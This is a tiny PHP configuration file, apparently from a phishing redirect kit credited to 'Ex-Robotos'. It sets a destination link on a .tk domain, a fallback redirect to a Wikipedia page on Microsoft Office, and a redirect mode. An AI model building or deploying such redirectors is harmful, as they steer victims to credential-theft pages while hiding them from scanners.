<?php
/* 
New redirect 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
*/
$pagelink="https://www.hemet.tk/PYEYE";
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="1";// 1:header - 2:script
?>